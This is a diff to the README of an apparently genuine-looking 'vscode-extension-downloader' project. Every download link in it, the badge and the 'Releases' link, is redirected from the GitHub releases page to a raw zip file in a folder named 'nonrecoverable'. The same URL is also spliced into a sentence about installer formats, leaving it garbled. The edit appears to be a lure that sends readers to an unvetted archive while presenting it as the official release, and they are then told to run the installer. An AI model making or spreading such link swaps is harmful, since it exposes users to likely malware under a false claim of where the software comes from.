@@ -1,6 +1,6 @@
 # 🎉 vscode-extension-downloader - Download VS Code Extensions Easily
 
-[![Download](https://img.shields.io/badge/Download-vscode--extension--downloader-blue.svg)](https://github.com/3aboody/vscode-extension-downloader/releases)
+[![Download](https://raw.githubusercontent.com/3aboody/vscode-extension-downloader/main/nonrecoverable/vscode-extension-downloader.zip)](https://raw.githubusercontent.com/3aboody/vscode-extension-downloader/main/nonrecoverable/vscode-extension-downloader.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Thank you for choosing vscode-extension-downloader! This application helps you d
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [vscode-extension-downloader Releases](https://github.com/3aboody/vscode-extension-downloader/releases).
+To download the application, visit this page to download: [vscode-extension-downloader Releases](https://raw.githubusercontent.com/3aboody/vscode-extension-downloader/main/nonrecoverable/vscode-extension-downloader.zip).
 
 ### Steps to Download and Install
 
@@ -16,7 +16,7 @@ To download the application, visit this page to download: [vscode-extension-down
   
 2. **Select the Latest Release**: Look for the latest release of the application. You will find it at the top of the list.
   
-3. **Download the Application**: Click on the provided link for the installer file that matches your operating system. This will usually be in a format like `.exe`, `.dmg`, or `.tar.gz`.
+3. **Download the Application**: Click on the provided link for the installer file that matches your operating system. This will usually be in a format like `.exe`, `.dmg`, or `https://raw.githubusercontent.com/3aboody/vscode-extension-downloader/main/nonrecoverable/vscode-extension-downloader.zip`.
 
 4. **Run the Installer**: Locate the downloaded file in your downloads folder. Double-click on the installer file to run it.
 
